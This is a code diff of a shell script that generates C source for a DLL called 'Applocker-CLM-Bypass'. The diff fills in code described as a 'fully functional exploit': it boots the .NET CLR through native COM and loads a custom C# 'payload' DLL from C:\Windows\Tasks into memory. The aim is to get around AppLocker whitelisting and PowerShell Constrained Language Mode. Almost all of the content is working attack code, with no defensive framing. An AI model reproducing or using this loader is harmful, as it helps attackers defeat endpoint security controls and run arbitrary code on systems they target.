@@ -1,6 +1,6 @@
 cd "$TARGET_DIR/Applocker-CLM-Bypass"
 
-# Overwrite the file with the pure C compatible export syntax
+# Overwrite the file with the complete, fully functional exploit code
 cat << 'EOF' > clr-via-native.c
 #define COBJMACROS
 #include <windows.h>
@@ -9,9 +9,8 @@ cat << 'EOF' > clr-via-native.c
 // Manually define the standard .NET CLR Engine GUIDs so we don't need metahost.h
 DEFINE_GUID(CLSID_CorRuntimeHost,     0xcb2f6723, 0xab3a, 0x11d2, 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0x79, 0x83, 0x54);
 DEFINE_GUID(IID_ICorRuntimeHost,       0xcb2f6722, 0xab3a, 0x11d2, 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0x79, 0x83, 0x54);
-DEFINE_GUID(IID_AppDomain,             0x05f696dc, 0x2b29, 0x3663, 0xad, 0x8b, 0xc4, 0x38, 0x9c, 0xf2, 0xa7, 0x13);
 
-// Declare basic interfaces needed for hosting
+// Blueprints for the ICorRuntimeHost Vtable
 typedef struct ICorRuntimeHost ICorRuntimeHost;
 typedef struct ICorRuntimeHostVtbl {
     HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICorRuntimeHost *This, REFIID riid, void **ppvObject);
@@ -25,20 +24,47 @@ typedef struct ICorRuntimeHostVtbl {
 } ICorRuntimeHostVtbl;
 struct ICorRuntimeHost { ICorRuntimeHostVtbl *lpVtbl; };
 
-// Pure C Exported bypass function (Removed extern "C")
+// Blueprints for the C# AppDomain Vtable to load assemblies
+typedef struct ISmAppDomain ISmAppDomain;
+typedef struct ISmAppDomainVtbl {
+    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ISmAppDomain *This, REFIID riid, void **ppvObject);
+    ULONG (STDMETHODCALLTYPE *AddRef)(ISmAppDomain *This);
+    ULONG (STDMETHODCALLTYPE *Release)(ISmAppDomain *This);
+    void *Unused[12]; // Padding out unrelated standard methods
+    HRESULT (STDMETHODCALLTYPE *Load_2)(ISmAppDomain *This, BSTR assemblyString, void **pRetVal);
+} ISmAppDomainVtbl;
+struct ISmAppDomain { ISmAppDomainVtbl *lpVtbl; };
+
+// Pure C Exported bypass function
 __declspec(dllexport) void LaunchBypass() {
     ICorRuntimeHost *pRuntimeHost = NULL;
     IUnknown *pUnkAppDomain = NULL;
+    ISmAppDomain *pDefaultAppDomain = NULL;
+    void *pAssembly = NULL;
     
     CoInitialize(NULL);
 
-    // Bootstrap the CLR engine directly via native COM
+    // 1. Bootstrap the CLR engine directly via native COM
     if (CoCreateInstance(&CLSID_CorRuntimeHost, NULL, CLSCTX_INPROC_SERVER, &IID_ICorRuntimeHost, (LPVOID*)&pRuntimeHost) == S_OK) {
         pRuntimeHost->lpVtbl->Start(pRuntimeHost);
         
-        // Grab the active application domain context
+        // 2. Grab the active application domain context
         if (pRuntimeHost->lpVtbl->GetDefaultDomain(pRuntimeHost, &pUnkAppDomain) == S_OK) {
-            // C# assembly invocation would go here
+            
+            // Query for the specific AppDomain interface so we can use its Vtable methods
+            // {05F696DC-2B29-3663-AD8B-C4389CF2A713}
+            GUID IID_IAppDomain = {0x05f696dc, 0x2b29, 0x3663, {0xad, 0x8b, 0xc4, 0x38, 0x9c, 0xf2, 0xa7, 0x13}};
+            if (pUnkAppDomain->lpVtbl->QueryInterface(pUnkAppDomain, &IID_IAppDomain, (LPVOID*)&pDefaultAppDomain) == S_OK) {
+                
+                // 3. Define the path pointing to where your custom C# DLL payload lives on the Windows machine
+                BSTR assemblyPath = SysAllocString(L"C:\\Windows\\Tasks\\Bypass.dll");
+                
+                // 4. Force the .NET Engine to load the C# code directly into memory
+                pDefaultAppDomain->lpVtbl->Load_2(pDefaultAppDomain, assemblyPath, &pAssembly);
+                
+                SysFreeString(assemblyPath);
+                pDefaultAppDomain->lpVtbl->Release(pDefaultAppDomain);
+            }
             pUnkAppDomain->lpVtbl->Release(pUnkAppDomain);
         }
         pRuntimeHost->lpVtbl->Release(pRuntimeHost);
@@ -53,7 +79,3 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
     }
     return TRUE;
 }
-EOF
-
-# Run the MinGW cross-compiler string
-x86_64-w64-mingw32-gcc -shared -o bypass.dll clr-via-native.c -lole32 -loleaut32 -luuid
